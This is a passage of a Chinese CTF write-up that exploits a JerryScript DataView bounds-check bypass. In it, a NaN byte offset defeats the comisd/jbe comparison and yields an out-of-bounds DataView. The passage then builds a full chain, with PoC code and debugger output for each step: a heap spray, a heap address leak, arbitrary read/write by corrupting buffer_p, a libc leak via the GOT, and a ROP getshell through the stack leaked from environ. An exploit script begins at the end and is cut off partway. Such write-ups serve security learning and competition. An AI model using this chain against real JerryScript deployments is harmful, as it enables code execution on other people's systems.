+<p>需要注意的在 x86&#x2F;x64 汇编中，comisd 指令在遇到 NaN 时，如果任一操作数是 NaN，它会设置 ZF&#x3D;1, PF&#x3D;1, CF&#x3D;1，接下来的jbe，它的跳转条件是 CF&#x3D;1 或 ZF&#x3D;1，所以这里只要涉及到NaN的比较，这里都会被解释成offset &lt;&#x3D; length，结果就是绕过这个bound check</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_I75RThIOao.png" srcset="/img/loading.gif" lazyload></p>
+<p>调试下eflag，没有比较之前是这样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; info registers eflags<br>eflags         0x206               [ PF IF ]<br>pwndbg&gt; <br></code></pre></td></tr></table></figure>
+
+
+<p>比较之后是这样，成功绕过了这个检查</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">pwndbg&gt; info registers eflags<br>eflags         0x247               [ CF PF ZF IF ]<br>pwndbg&gt; <br></code></pre></td></tr></table></figure>
+
+
+<p>现在可以得到一个结论，对于这个检查if (offset &gt; buffer_byte_length)</p>
+<p>offset &#x3D; NaN 时，可以直接pass</p>
+<p>同样的，这个绕过模式还可以传播为(NaN + arb_val &gt; buffer_byte_length)→false，所以我们可以在NaN后面加上任意偏移，这个也就是上方的[b]处，if (offset + byte_length_to_index &gt; buffer_byte_length)</p>
+<p>进入[b]处也很简单，参数是三个就行，也就用到了上方的语法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab,<span class="hljs-title class_">NaN</span>,<span class="hljs-number">0xffffffff</span>);<br></code></pre></td></tr></table></figure>
+
+
+<p>这里，我将view_byte_length设置为0xfffffff，buffer_byte_length仅为0x100，但是由于offset是nan，所以此时的eflag如下，也就绕过了bound check</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_3P0fCzJCNP.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终的NaN被类型转化为uint32_t变成0，但是view_byte_length成功赋值为0xffffffff。至此我们已经成功构造了一个存在越界的dataview对象，我们现在需要接着分析对于dataview的get和set操作，看一下是否可以将这个漏洞扩大，变成一个可以越界读写的原语</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_aWaMLWxpta.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="ecma-op-dataview-get-set-view-value"><a href="#ecma-op-dataview-get-set-view-value" class="headerlink" title="ecma_op_dataview_get_set_view_value"></a>ecma_op_dataview_get_set_view_value</h4><p>有了阅读ecma_op_dataview_create的经验，我们其实只需要找这个函数中对于边界检查的部分，通过最后的对象属性赋值部分来验证猜想，所以这个函数的代码被精简如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ecma_value_t</span><br><span class="hljs-title function_">ecma_op_dataview_get_set_view_value</span> <span class="hljs-params">(<span class="hljs-type">ecma_value_t</span> view, <span class="hljs-comment">/**&lt; the operation&#x27;s &#x27;view&#x27; argument */</span></span><br><span class="hljs-params">                                     <span class="hljs-type">ecma_value_t</span> request_index, <span class="hljs-comment">/**&lt; the operation&#x27;s &#x27;requestIndex&#x27; argument */</span></span><br><span class="hljs-params">                                     <span class="hljs-type">ecma_value_t</span> is_little_endian_value, <span class="hljs-comment">/**&lt; the operation&#x27;s</span></span><br><span class="hljs-comment"><span class="hljs-params">                                                                           *   &#x27;isLittleEndian&#x27; argument */</span></span><br><span class="hljs-params">                                     <span class="hljs-type">ecma_value_t</span> value_to_set, <span class="hljs-comment">/**&lt; the operation&#x27;s &#x27;value&#x27; argument */</span></span><br><span class="hljs-params">                                     <span class="hljs-type">ecma_typedarray_type_t</span> id)</span> <span class="hljs-comment">/**&lt; the operation&#x27;s &#x27;type&#x27; argument */</span><br>&#123;<br>  <span class="hljs-comment">/* 1 - 2. */</span><br>  <span class="hljs-type">ecma_dataview_object_t</span> *view_p = ecma_op_dataview_get_object (view);<br><br>  <span class="hljs-keyword">if</span> (JERRY_UNLIKELY (view_p == <span class="hljs-literal">NULL</span>))<br>  &#123;<br>    <span class="hljs-keyword">return</span> ECMA_VALUE_ERROR;<br>  &#125;<br><br>  <span class="hljs-type">ecma_object_t</span> *buffer_p = view_p-&gt;buffer_p;<br>  JERRY_ASSERT (ecma_object_class_is (buffer_p, ECMA_OBJECT_CLASS_ARRAY_BUFFER)<br>                || ecma_object_is_shared_arraybuffer (buffer_p));<br><br>  <span class="hljs-comment">/* 3. */</span><br>  <span class="hljs-type">ecma_number_t</span> get_index;<br>  <span class="hljs-type">ecma_value_t</span> number_index_value = ecma_op_to_index (request_index, &amp;get_index);<br><br>  <span class="hljs-keyword">if</span> (ECMA_IS_VALUE_ERROR (number_index_value))<br>  &#123;<br>    <span class="hljs-keyword">return</span> number_index_value;<br>  &#125;<br><br>..........<br><br>  <span class="hljs-comment">/* GetViewValue 7., SetViewValue 9. */</span><br>  <span class="hljs-type">uint32_t</span> view_offset = view_p-&gt;byte_offset;<br><br>  <span class="hljs-comment">/* GetViewValue 8., SetViewValue 10. */</span><br>  <span class="hljs-type">uint32_t</span> view_size = view_p-&gt;header.u.cls.u3.length;<br><br>  <span class="hljs-comment">/* GetViewValue 9., SetViewValue 11. */</span><br>  <span class="hljs-type">uint8_t</span> element_size = (<span class="hljs-type">uint8_t</span>) (<span class="hljs-number">1</span> &lt;&lt; (ecma_typedarray_helper_get_shift_size (id)));<br><br>  <span class="hljs-comment">/* GetViewValue 10., SetViewValue 12. */</span><br>  <span class="hljs-keyword">if</span> (get_index + element_size &gt; (<span class="hljs-type">ecma_number_t</span>) view_size)<span class="hljs-comment">//[a]</span><br>  &#123;<br>    ecma_free_value (value_to_set);<br>    <span class="hljs-keyword">return</span> ecma_raise_range_error (ECMA_ERR_START_OFFSET_IS_OUTSIDE_THE_BOUNDS_OF_THE_BUFFER);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (ECMA_ARRAYBUFFER_LAZY_ALLOC (buffer_p))<br>  &#123;<br>    ecma_free_value (value_to_set);<br>    <span class="hljs-keyword">return</span> ECMA_VALUE_ERROR;<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (ecma_arraybuffer_is_detached (buffer_p))<br>  &#123;<br>    ecma_free_value (value_to_set);<br>    <span class="hljs-keyword">return</span> ecma_raise_type_error (ECMA_ERR_ARRAYBUFFER_IS_DETACHED);<br>  &#125;<br><br>  <span class="hljs-comment">/* GetViewValue 11., SetViewValue 13. */</span><br>  <span class="hljs-type">bool</span> system_is_little_endian = ecma_dataview_check_little_endian ();<br><br>  <span class="hljs-type">ecma_typedarray_info_t</span> info;<br>  info.id = id;<br>  info.length = view_size;<br>  info.shift = ecma_typedarray_helper_get_shift_size (id);<br>  info.element_size = element_size;<br>  info.offset = view_p-&gt;byte_offset;<br>  info.array_buffer_p = buffer_p;<br><br>  <span class="hljs-comment">/* GetViewValue 12. */</span><br>  <span class="hljs-type">uint8_t</span> *block_p = ecma_arraybuffer_get_buffer (buffer_p) + (<span class="hljs-type">uint32_t</span>) get_index + view_offset;<br><br>..........<br>&#125; <span class="hljs-comment">/* ecma_op_dataview_get_set_view_value */</span><br></code></pre></td></tr></table></figure>
+
+
+<p>构造的调试代码如下，这里是构造了一个dv的越界越界读操作</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> ab = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab,<span class="hljs-title class_">NaN</span>,<span class="hljs-number">0xffffffff</span>);<br>dv.<span class="hljs-title function_">getUint32</span>(<span class="hljs-number">0x200</span>,<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure>
+
+
+<p>首先分析上面的源码</p>
+<p>注释1-3部分是对于dataview header和arraybuffer header的检查，如果说单纯修改指针，那么这个检查过不去是没用的</p>
+<p>接着直接来到上方[a]部分，也就是这里的边界检查if (get_index + element_size &gt; (ecma_number_t) view_size)，这个逻辑很正常，就是检查用户传入的index+取出的elment size是否超过了views_size。</p>
+<p>但是需要注意的是这里的view_size已经被我们修改成了0xffffffff，所以这里相当于直接绕过了这个检查</p>
+<p>下方的getindex是0x200，已经超过了arraybuffer的长度，但是由于view_size被修改，所以越界了，后续就是存值取值的操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_Z04_g7FOlK.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>由于笔者也是第一次接触jerryscript的利用，所以最后的脚本经过大量调试得到，所以笔者这里就解释下写利用的思路</p>
+<h2 id="泄漏jerry-global-heap"><a href="#泄漏jerry-global-heap" class="headerlink" title="泄漏jerry_global_heap"></a>泄漏jerry_global_heap</h2><p>我们之前已经得到了一个越界的dv，现在需要思考如何可控。</p>
+<p>上面提到了可以通过申请0x1000这样length的arraybuffer，这样就可以让arraybuffer不inline表示，从而分配出一个raw pointer。因此可以通过一个越界的dv去读取内存后方arraybuffer中的buffer_p字段，那么现在至少存在了一个jerry heap的地址。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_fscHYkZobQ.png" srcset="/img/loading.gif" lazyload></p>
+<p>接着的问题是如何去定位这个arraybuffer，首先我需要保证我的越界dv地址在受害arraybuffer的前方，所以需要调试一下，这里发现是没有问题的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_bRV2L5gqRQ.png" srcset="/img/loading.gif" lazyload></p>
+<p>最简单的定位思路就是写一个特征值，但问题是这样只能扫描到特征值的位置，我们通过特征值的位置无法定位到arraybuffer指向的位置。像下面红框中一样，只能扫描到这个值，但是无法反推。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_aUIapA5ZnT.png" srcset="/img/loading.gif" lazyload></p>
+<p>解决这个问题就需要思考arraybuffer的特征，arraybuffer的特征由前面的0x10个字节的header决定，下发的四个字段中有type、gc_next、prototype……</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/4wx 0x5d89998be768<br>0x5d89998be768 &lt;jerry_global_heap+70888&gt;:  0x22990012  0x016c0000  0x00000319  0x00001000<br>pwndbg&gt; <br></code></pre></td></tr></table></figure>
+
+
+<p>因此我选取了Type、ProtoType、ByteLength，这三个字段在我堆喷出来的对象中是一致的，所以我可以通过header的字段来确定受害arraybuffer的位置，那么相邻的就是jerry_global_heap段上的值</p>
+<p>可以得到这样的一个leak，通过减去0x11a30可以得到一个段开头的地址，但是这个是随机的，根据你写的脚本和环境决定</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_z8iqO3si2a.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以为了稳定性我进行了如下的计算，最后的情况是在多0x9000和少0x9000的情况下摆动</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">let</span> ptr_lo = dv.<span class="hljs-title function_">getUint32</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">let</span> ptr_hi = dv.<span class="hljs-title function_">getUint32</span>(target_idx * <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">let</span> heap_global_addr = (<span class="hljs-title class_">BigInt</span>(ptr_hi) &lt;&lt; <span class="hljs-number">32n</span>) | <span class="hljs-title class_">BigInt</span>(ptr_lo);<br>heap_global_addr = heap_global_addr - <span class="hljs-number">0x11058n</span>;<br>heap_global_addr = heap_global_addr &amp; ~ <span class="hljs-number">0xfffn</span>;<br><br><br><span class="hljs-comment">// // 题目下发版本的偏移</span><br>heap_global_addr = heap_global_addr + <span class="hljs-number">0x280n</span>;<br><span class="hljs-comment">// heap_global_addr = heap_global_addr - 0x9000n + 0x280n;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>可以看到jerry_global_heap起始地址是这个段的开头+0x280</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_kdiXFqG6lT.png" srcset="/img/loading.gif" lazyload></p>
+<p>同时这个jerry_global_heap开头的一段内存上是存在函数指针的值，所以我们接下来需要思考如何去利用这个jerry_global_heap来泄漏出code_base、libc等值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_BN_9IpYsC2.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="越界读写转化为任意读写"><a href="#越界读写转化为任意读写" class="headerlink" title="越界读写转化为任意读写"></a>越界读写转化为任意读写</h2><p>通过上方的思路，确实定位到了受害arraybuffer的位置，但是由于这里的arraybuffer是堆喷出来的（如下所示），所以我还需要确定这个arrybuffer的具体位置</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">inin_dv</span>(<span class="hljs-params">arr,arr_length,ab_length</span>)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;arr_length; i++) &#123;<br>        arr.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(ab_length)));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;arr_length; i++) &#123;<br>        arr[i].<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_">u64_to_f64</span>(<span class="hljs-title class_">MagicSign</span>), <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+<p>确定受害arraybuffer的思路是也很清晰，我这里已经可以越界读定位到受害arraybuffer的header，所以可以通过越界写修改arraybuffer的byteLength字段，然后遍历所有的arraybuffer来检查哪一个对象的byteLength被修改了，至此我们已经可以准确定位arraybuffer了</p>
+<p>定位到arraybuffer，下面的任意读写就是修改buffer_p字段，然后调用dataview的get&#x2F;set方法即可</p>
+<h2 id="避免gc回收"><a href="#避免gc回收" class="headerlink" title="避免gc回收"></a>避免gc回收</h2><p>这里是为了提高任意读写的稳定性，如何笔者发现完成一次任意读写这里就会触发gc移动，如果此时的buffer_p是一个gc无法回收的地址，那么就会程序崩溃，所以解决思路也很简单，任意读写完毕之后，把原本的buffer_p再修改回去。</p>
+<p>同时，为了防止原本布置的victim对象被gc回收，可以通过如下方式增加ref count</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MakeRef</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> [vic_dv_array];<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+
+<p>也可以通过上面笔者提到的思路，直接利用越界去修改ref count的值，这样也可以</p>
+<h2 id="泄漏libc"><a href="#泄漏libc" class="headerlink" title="泄漏libc"></a>泄漏libc</h2><p>存在任意读写之后，可以通过读jerry_global_heap段开头的一些handler函数的值，确定code base的值，从而定位到got，然后泄漏位于libc中函数的值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_Ve90Tq-SoA.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>这里笔者由于很久没有接触house of打法，已经不知道2.39应该怎么做了，所以这里采用了通过environ泄漏栈地址的方式，然后劫持main函数的返回地址，实现rop</p>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> buf = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">8</span>);<br><span class="hljs-keyword">var</span> f32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float32Array</span>(buf);<br><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buf);<br><span class="hljs-keyword">var</span> u8 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(buf);<br><span class="hljs-keyword">var</span> u16 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint16Array</span>(buf);<br><span class="hljs-keyword">var</span> u32 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf);<br><span class="hljs-keyword">var</span> u64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(buf);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">lh_u32_to_f64</span>(<span class="hljs-params">l,h</span>)&#123;<br>    u32[<span class="hljs-number">0</span>] = l;<br>    u32[<span class="hljs-number">1</span>] = h;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f64_to_u32l</span>(<span class="hljs-params">val</span>)&#123;<br>    f64[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> u32[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f64_to_u32h</span>(<span class="hljs-params">val</span>)&#123;<br>    f64[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> u32[<span class="hljs-number">1</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f64_to_u64</span>(<span class="hljs-params">val</span>)&#123;<br>    f64[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> u64[<span class="hljs-number">0</span>];<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u64_to_f64</span>(<span class="hljs-params">val</span>)&#123;<br>    u64[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u64_to_u32_lo</span>(<span class="hljs-params">val</span>)&#123;<br>    u64[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> u32[<span class="hljs-number">0</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">u64_to_u32_hi</span>(<span class="hljs-params">val</span>)&#123;<br>    u64[<span class="hljs-number">0</span>] = val;<br>    <span class="hljs-keyword">return</span> u32[<span class="hljs-number">1</span>];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">logg</span>(<span class="hljs-params">name, addr</span>) &#123;<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[+] &quot;</span> + name + <span class="hljs-string">&quot;: 0x&quot;</span> + addr.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>));<br>&#125;<br><br><span class="hljs-keyword">let</span> grooming = [];<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gc</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">print</span>(<span 